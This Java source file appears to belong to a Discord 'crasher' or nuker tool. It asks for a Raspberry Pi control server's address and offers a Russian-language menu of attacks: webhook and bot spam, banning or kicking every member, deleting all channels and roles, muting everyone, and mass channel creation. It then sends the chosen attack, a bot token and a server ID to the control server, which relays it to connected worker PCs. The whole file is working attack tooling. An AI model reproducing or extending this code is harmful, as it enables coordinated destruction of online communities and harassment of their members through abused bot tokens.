package CrAsHeR;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.Scanner;

public class ProxyManager {
    private static final HttpClient client = HttpClient.newHttpClient();
    private static String proxyUrl;
    private static final Scanner scanner = new Scanner(System.in);
    
    public static void executeProxyAttack(String token, String guildId) {
        System.out.println("\n╔════════════════════════════════════╗");
        System.out.println("║     PROXY АТАКА - НАСТРОЙКА        ║");
        System.out.println("╚════════════════════════════════════╝");
        
        System.out.print("[>] IP Raspberry Pi сервера: ");
        String ip = scanner.nextLine().trim();
        proxyUrl = "http://" + ip + ":8080";
        
        System.out.println("\n╔════════════════════════════════════╗");
        System.out.println("║ [1] Спам вебхуками                 ║");
        System.out.println("║ [2] Спам ботом                     ║");
        System.out.println("║ [3] Кик всех участников            ║");
        System.out.println("║ [4] Бан всех участников            ║");
        System.out.println("║ [5] Удалить все каналы             ║");
        System.out.println("║ [6] Удалить все роли               ║");
        System.out.println("║ [7] Мут всех участников            ║");
        System.out.println("║ [8] Массовое создание каналов      ║");
        System.out.println("╚════════════════════════════════════╝");
        System.out.print("[>] Выберите тип атаки: ");
        
        String attackType = scanner.nextLine().trim();
        
        String command = attackType + "|" + token + "|" + guildId;
        
        try {
            HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(proxyUrl + "/command"))
                .POST(HttpRequest.BodyPublishers.ofString(command))
                .build();
            
            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            
            if (response.statusCode() == 200) {
                System.out.println("[✓] Команда отправлена всем воркерам!");
                System.out.println("[*] Атака началась на всех подключенных ПК...");
            } else {
                System.out.println("[✗] Ошибка отправки команды");
            }
        } catch (Exception e) {
            System.out.println("[✗] Ошибка подключения к серверу: " + e.getMessage());
        }
    }
    
    public static void checkProxyStatus() {
        if (proxyUrl == null) {
            System.out.print("[>] IP Raspberry Pi сервера: ");
            String ip = scanner.nextLine().trim();
            proxyUrl = "http://" + ip + ":8080";
        }
        
        try {
            HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(proxyUrl + "/status"))
                .GET()
                .build();
            
            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            System.out.println("[*] Статус proxy сервера: " + response.body());
        } catch (Exception e) {
            System.out.println("[✗] Ошибка получения статуса: " + e.getMessage());
        }
    }
}
